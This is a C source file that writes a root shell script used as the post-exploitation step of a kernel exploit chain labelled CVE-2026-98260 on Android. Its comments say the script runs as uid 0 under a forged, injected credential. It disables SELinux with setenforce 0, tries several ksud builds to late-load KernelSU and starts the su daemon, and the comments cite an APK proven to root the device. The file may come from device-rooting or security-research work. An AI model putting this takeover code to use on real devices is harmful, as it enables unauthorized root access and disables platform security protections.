/*
 * ksu_script.c - KernelSU 接管脚本生成器
 *
 * 从 ksu.c 拆出来的原因：**这个脚本是整条 KSU 接管链路里最脆的一环**。
 * 2026-10-31 真机就因为「只用一个 ksud 候选」导致 late-load 打印一段帮助、
 * daemon 起不来，最终表现为「模块加载了但没有 su」——而脚本写错了不会在
 * 编译期暴露，只会在设备上表现为「没 su」。所以把它拆成一个只依赖
 * stdio/string 的可移植单元，宿主单测可以直接生成脚本并做文本/语法断言。
 *
 * 脚本语义（ksud 候选阶梯）：
 *   1) 逐个候选（KSUD0/KSUD1/...）：先 late-load --kmi，再裸 late-load；
 *   2) 模块注册（/proc/modules 出现 kernelsu）后才起 daemon，且必须用
 *      **真正能 late-load 的那个**构建 —— 旧构建只会打印帮助后退出；
 *   3) daemon 用 pidof ksud 确认起来没有；
 *   4) 最终用了哪个记在 ksud_used= 里。
 *
 * chmod 由调用方（ksu.c）负责，本文件只写内容 —— 保持宿主可编译。
 */

#include <stdio.h>
#include <string.h>

#include "ksu_script.h"

int ksu_write_takeover_script(const char *path, char ksuds[][512], int n_ksuds,
				 const char *kmi, const char *log)
{
	FILE *f = fopen(path, "w");
	int i;

	if (!f)
		return -1;
	fprintf(f, "#!/system/bin/sh\n");
	fprintf(f, "# CVE-2026-98260 KSU takeover: this script is executed only by rootd (uid=0)\n");
	fprintf(f, "# Shape copied from the device-proven PC flow\n");
	fprintf(f, "# (CVE-2026-98260-NEW/tools/ksu_activate.sh:126-142):\n");
	fprintf(f, "#   one late-load --kmi attempt, then (only if not live) one plain\n");
	fprintf(f, "#   late-load. No --allow-shell, no wider ladder: the ladder was the\n");
	fprintf(f, "#   only substantial deviation from the verified combination.\n");
	fprintf(f, "#\n");
	fprintf(f, "# 6.18 真机（2026-10-31）追加：**多 ksud 候选阶梯**。\n");
	fprintf(f, "#   设备上同时存在管理器里的 libksud.so 与 APK 自带的 ksud，两者版本\n");
	fprintf(f, "#   不同；不支持 late-load / daemon 的那个只会打印一段 -h/-V 帮助后\n");
	fprintf(f, "#   退出 —— 模块可能加载了，但 ksud daemon 没起来，最终「没有 su」。\n");
	fprintf(f, "#   这里按优先级依次尝试每个候选，直到某个构建既能注册模块、又能\n");
	fprintf(f, "#   把 daemon 拉起来（ksud_used= 记录最终用的是哪个）。\n");
	for (i = 0; i < n_ksuds; i++)
		fprintf(f, "KSUD%d='%s'\n", i, ksuds[i]);
	fprintf(f, "KMI='%s'\n", kmi);
	fprintf(f, "LOG='%s'\n", log);
	/* sync after every marker: a panic mid-attempt must not cost us the
	 * evidence of which attempt was running. */
	fprintf(f, "echo \"[ksu] begin uid=$(id -u) enf=$(getenforce)\" > \"$LOG\"\n");
	/* 每个候选的体积都打出来：4990848 = 管理器里的 libksud.so（旧版，不支持
	 * late-load / daemon），6402736 = APK 自带构建（sha256 049491e2b4cc0a6c...）。
	 * 走错构建的表现是「模块加载了但没有 su」，所以这里必须可见。 */
	fprintf(f, "for K in");
	for (i = 0; i < n_ksuds; i++)
		fprintf(f, " \"$KSUD%d\"", i);
	fprintf(f, "; do\n");
	fprintf(f, "  SZ=$(stat -c %%s \"$K\" 2>/dev/null)\n");
	fprintf(f, "  [ -z \"$SZ\" ] && SZ=$(ls -l \"$K\" 2>/dev/null | awk '{print $5}')\n");
	fprintf(f, "  echo \"[ksu] candidate=$K size=${SZ:-unknown}\" >> \"$LOG\"\n");
	fprintf(f, "  chmod 755 \"$K\" 2>/dev/null\n");
	fprintf(f, "done\n");
	fprintf(f, "sync\n");
	fprintf(f, "setenforce 0 2>/dev/null\n");
	fprintf(f, "echo \"[ksu] setenforce_rc=$? enf=$(getenforce 2>/dev/null)\" >> \"$LOG\"\n");
	fprintf(f, "sync\n");
	fprintf(f, "\n");
	/*
	 * live(): identical semantics to the PC script (ksu_activate.sh:54-56).
	 * late-load registers the module asynchronously; probing /proc/modules
	 * immediately after ksud returns gives a false negative ("rc=0 but
	 * live=no"), so every probe sleeps 1s first. Case-insensitive like the
	 * reference's `grep -qi`.
	 */
	fprintf(f, "live() { sleep 1; grep -qi kernelsu /proc/modules 2>/dev/null && echo yes || echo no; }\n");
	fprintf(f, "\n");
	fprintf(f, "LIVE=$(live)\n");
	fprintf(f, "echo \"[ksu] live_initial=$LIVE\" >> \"$LOG\"\n");
	fprintf(f, "KSUD_USED=''\n");
	fprintf(f, "for K in");
	for (i = 0; i < n_ksuds; i++)
		fprintf(f, " \"$KSUD%d\"", i);
	fprintf(f, "; do\n");
	fprintf(f, "  [ -x \"$K\" ] || { echo \"[ksu] skip (not executable): $K\" >> \"$LOG\"; continue; }\n");
	fprintf(f, "  if [ \"$LIVE\" != yes ]; then\n");
	fprintf(f, "    echo \"[ksu] try: $K late-load --kmi $KMI\" >> \"$LOG\"\n");
	fprintf(f, "    \"$K\" late-load --kmi \"$KMI\" >> \"$LOG\" 2>&1\n");
	fprintf(f, "    echo \"[ksu] rc=$? ksud=$K\" >> \"$LOG\"\n");
	fprintf(f, "    sync\n");
	fprintf(f, "    LIVE=$(live)\n");
	fprintf(f, "    echo \"[ksu] live=$LIVE ksud=$K\" >> \"$LOG\"\n");
	fprintf(f, "    if [ \"$LIVE\" != yes ]; then\n");
	fprintf(f, "      echo '[ksu] try: $K late-load (no args, ksud picks the embedded KMI)' >> \"$LOG\"\n");
	fprintf(f, "      \"$K\" late-load >> \"$LOG\" 2>&1\n");
	fprintf(f, "      echo \"[ksu] rc=$? ksud=$K\" >> \"$LOG\"\n");
	fprintf(f, "      sync\n");
	fprintf(f, "      LIVE=$(live)\n");
	fprintf(f, "      echo \"[ksu] live=$LIVE ksud=$K\" >> \"$LOG\"\n");
	fprintf(f, "    fi\n");
	fprintf(f, "  fi\n");
	fprintf(f, "  if [ \"$LIVE\" = yes ]; then\n");
	fprintf(f, "    if ! pidof ksud >/dev/null 2>&1; then\n");
	fprintf(f, "      nohup \"$K\" >/dev/null 2>&1 &\n");
	fprintf(f, "      sleep 2\n");
	fprintf(f, "    fi\n");
	fprintf(f, "    if pidof ksud >/dev/null 2>&1; then\n");
	fprintf(f, "      KSUD_USED=$K\n");
	fprintf(f, "      break\n");
	fprintf(f, "    fi\n");
	fprintf(f, "    echo '[ksu] daemon not up with this ksud, trying next candidate' >> \"$LOG\"\n");
	fprintf(f, "  fi\n");
	fprintf(f, "done\n");
	fprintf(f, "\n");
	/*
	 * Do NOT start the ksud daemon from here.
	 *
	 * This script runs through rootd, i.e. as uid 0 with the *injected forged*
	 * cred (SELinux: u:object_r:unlabeled:s0). Anything started from here
	 * inherits that cred, and the cred lives in a page the kernel no longer owns
	 * -- so the daemon could never be killed without risking a panic, and every
	 * later attempt to reclaim those pages becomes a minefield.
	 *
	 * The PC reference starts it from a plain adb shell instead (run.py:572
	 * `nohup /data/local/tmp/ksud &`), which gives the daemon a normal cred.
	 * The host does the same after this step returns, so all we do here is report
	 * the module state.
	 */
	/*
	 * Start the ksud daemon -- restored on purpose.
	 *
	 * The baseline APK that is proven to root this device (GhostKey111.apk)
	 * does exactly this, after the last late-load attempt and not inside the
	 * attempt loop; without it no su channel exists afterwards and the run
	 * reports "not rooted" even when the module did load. Real-device evidence
	 * outweighs the earlier reasoning that skipping it avoids handing the
	 * daemon a borrowed cred: the daemon is started here as uid 0, and any
	 * concern about its cred belongs to the host-side startKsudDaemon() path,
	 * not to dropping the step entirely.
	 *
	 * Guard with pidof so a daemon started by an earlier attempt is not
	 * duplicated.
	 *
	 * 2026-10-31：起 daemon 这一步已经挪进上面的**候选阶梯**里 —— 起 daemon
	 * 必须用「真正能 late-load 的那个 ksud」，否则旧构建只会打印帮助后退出，
	 * 表现为「模块加载了但没有 su」。这里只负责把最终结果记进日志。
	 */
	fprintf(f, "echo \"[ksu] ksud_used=$KSUD_USED\" >> \"$LOG\"\n");
	fprintf(f, "echo \"[ksu] daemon pid=$(pidof ksud 2>/dev/null)\" >> \"$LOG\"\n");
	fprintf(f, "\n");
	fprintf(f, "echo '[ksu] note: rc is not a criterion -- ksud returns 0 even on silent failure' >> \"$LOG\"\n");
	fprintf(f, "echo \"[ksu] end live=$LIVE\" >> \"$LOG\"\n");
	fprintf(f, "exit 0\n");
	fclose(f);
	return 0;
}
